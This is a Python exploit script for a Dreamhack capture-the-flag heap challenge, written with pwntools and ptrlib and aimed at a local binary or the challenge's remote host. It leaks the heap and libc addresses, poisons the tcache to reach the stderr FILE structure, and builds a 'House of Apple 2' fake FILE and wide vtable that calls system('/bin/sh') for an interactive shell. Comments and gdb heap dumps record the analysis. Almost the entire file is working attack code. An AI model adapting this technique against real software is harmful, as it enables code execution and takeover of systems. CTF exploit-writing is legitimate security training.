#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./prob_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-linux-x86-64.so.2")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 12601)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


# cmd: 1 (alloc)
## type:
## 1: hhd
## 2: hhu
## 3: hd
## 4: hu
## 5: d
## 6: u
## 7: ld
## 8: lu
## 9: f
## 10: lf
## 11: malloc()

# cmd: 2 (read)

# cmd: 3 ()
## idxを２つ(var0, var1)を入力して、対応するtypeの大きい方を使用する
### 1 <= type <= 10:
#### values[var0] = values[var1]
### type == 11
####


def main():
    io = connect()

    def alloc(idx: int, type_: int, value: bytes, len: int = 0, line: bool = True):
        io.sendlineafter(b"> ", b"1")  # cmd
        io.sendlineafter(b"> ", str(idx).encode())  # idx
        io.sendlineafter(b"> ", str(type_).encode())  # type
        if 1 <= type_ <= 10:
            io.sendlineafter(b"> ", value)  # value
        elif type_ == 11:
            io.sendlineafter(b"> ", str(len).encode())  # len
            if line:
                io.sendlineafter(b"> ", value)  # value
            else:
                io.sendafter(b"> ", value)  # value
        return

    def read(idx: int):
        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"> ", str(idx).encode())
        return io.recvuntil(b"\ncmd", drop=True)

    def concatenate(idx1: int, idx2: int):
        io.sendlineafter(b"> ", b"3")
        io.sendlineafter(b"> ", str(idx1).encode())
        io.sendlineafter(b"> ", str(idx2).encode())
        return

    # heap base
    alloc(idx=0, type_=11, value=b"A" * 0x17, len=0x17, line=False)
    alloc(
        idx=1, type_=11, value=b"B" * 0x427, len=0x427, line=False
    )  # create a large chunk for libc leak
    concatenate(0, 1)
    alloc(idx=2, type_=11, value=b"", len=0)
    heap_base = ptr.u64(read(2)) << 12
    ptr.logger.info(f"heap_base: {hex(heap_base)}")

    # libc leak
    concatenate(1, 0)  # create a chunk in unsorted bin
    alloc(idx=3, type_=11, value=b"", len=0)
    libc.base = ptr.u64(read(3)) - unwrap(libc.symbol("main_arena")) - 1104

    # tcache poisoning to make a link to stderr
    alloc(idx=4, type_=11, value=b"B" * 0x107, len=0x107)
    alloc(idx=5, type_=11, value=b"C" * 0x107, len=0x107)
    alloc(idx=6, type_=11, value=b"D" * 0x7, len=0x7)
    concatenate(4, 5)
    alloc(idx=7, type_=7, value=str(heap_base + 0x2E0).encode())
    alloc(idx=8, type_=7, value=str(heap_base + 0x3F0).encode())
    concatenate(5, 4)
    concatenate(7, 6)
    concatenate(8, 6)
    fake_link = (heap_base + 0x410) >> 12 ^ (unwrap(libc.symbol("_IO_2_1_stderr_")))
    payload = b""
    payload += b"E" * 0x18
    payload += ptr.p64(0xF1)
    payload += ptr.p64(fake_link)
    alloc(idx=9, type_=11, value=payload, len=0x107)

    # house of apple 2
    fake_base = heap_base + 0x1900
    fake_wide_data_base = fake_base
    fake_wide_vtable_base = fake_base + 0x100

    fake_wide_data = b""
    fake_wide_data = fake_wide_data.ljust(0xE0, b"\0")
    fake_wide_data += ptr.p64(fake_wide_vtable_base)
    fake_wide_data = fake_wide_data.ljust(0x100, b"\0")

    fake_wide_vtable = b""
    fake_wide_vtable = fake_wide_vtable.ljust(0x68, b"\0")
    fake_wide_vtable += ptr.p64(unwrap(libc.symbol("system")))
    fake_wide_vtable = fake_wide_vtable.ljust(0x100, b"\0")
    alloc(idx=10, type_=11, value=fake_wide_data + fake_wide_vtable, len=0x207)

    fake_file = b""
    fake_file += b"  /bin/sh"
    fake_file = fake_file.ljust(0x28, b"\0")
    fake_file += ptr.p64(1)
    fake_file = fake_file.ljust(0xA0, b"\0")
    fake_file += ptr.p64(fake_wide_data_base)
    fake_file = fake_file.ljust(0xD8, b"\0")
    fake_file += ptr.p64(unwrap(libc.symbol("__GI__IO_wfile_jumps")))

    alloc(idx=11, type_=11, value=b"F" * 8, len=0xE7)
    alloc(idx=12, type_=11, value=fake_file, len=0xE7)

    # get a shell!
    io.sendlineafter(b"> ",b"0")

    io.interactive()
    return


# 0x55555555c000  0x0000000000000000      0x0000000000000291      ................
# 0x55555555c010  0x0000000000000001      0x0000000000000000      ................
# 0x55555555c020  0x0000000000000000      0x0000000000000000      ................
# 0x55555555c030  0x0000000000000000      0x0000000000000000      ................
# 0x55555555c040  0x0000000000000000      0x0000000000000000      ................
# 0x55555555c050  0x0000000000000000      0x0000000000000000      ................
# 0x55555555c060  0x0000000000000000      0x0000000000000000      ................
# 0x55555555c070  0x0000000000000000      0x0000000000000000      ................
# 0x55555555c080  0x0000000000000000      0x0000000000000000      ................
# 0x55555555c090  0x000055555555c2c0      0x0000000000000000

# 0x55555555c3d0  0x4343434343434343      0x4343434343434343      CCCCCCCCCCCCCCCC
# 0x55555555c3e0  0x4343434343434343      0x4343434343434343      CCCCCCCCCCCCCCCC
# 0x55555555c3f0  0x4343434343434343      0x4343434343434343      CCCCCCCCCCCCCCCC
# 0x55555555c400  0x4343434343434343      0x4343434343434343      CCCCCCCCCCCCCCCC
# 0x55555555c410  0x4343434343434343      0x4343434343434343      CCCCCCCCCCCCCCCC
# 0x55555555c420  0x4343434343434343      0x4343434343434343      CCCCCCCCCCCCCCCC
# 0x55555555c430  0x4343434343434343      0x4343434343434343      CCCCCCCCCCCCCCCC
# 0x55555555c440  0x4343434343434343      0x4343434343434343      CCCCCCCCCCCCCCCC
# 0x55555555c450  0x4343434343434343      0x4343434343434343      CCCCCCCCCCCCCCCC
# 0x55555555c460  0x4343434343434343      0x4343434343434343      CCCCCCCCCCCCCCCC
# 0x55555555c470  0x4343434343434343      0x4343434343434343      CCCCCCCCCCCCCCCC
# 0x55555555c480  0x4343434343434343      0x4343434343434343      CCCCCCCCCCCCCCCC
# 0x55555555c490  0x4343434343434343      0x4343434343434343      CCCCCCCCCCCCCCCC
# 0x55555555c4a0  0x4343434343434343      0x4343434343434343      CCCCCCCCCCCCCCCC
# 0x55555555c4b0  0x4243434343434343      0x0000000000000231      CCCCCCCB1.......         <-- unsortedbin[all][0]
# 0x55555555c4c0  0x00007ffff7e19ce0      0x00007ffff7e19ce0      ................
# 0x55555555c4d0  0x4242424242424242      0x4242424242424242      BBBBBBBBBBBBBBBB
# 0x55555555c4e0  0x4242424242424242      0x4242424242424242      BBBBBBBBBBBBBBBB
# 0x55555555c4f0  0x4242424242424242      0x4242424242424242      BBBBBBBBBBBBBBBB
# 0x55555555c500  0x4242424242424242      0x4242424242424242      BBBBBBBBBBBBBBBB
# 0x55555555c510  0x4242424242424242      0x4242424242424242      BBBBBBBBBBBBBBBB


if __name__ == "__main__":
    main()
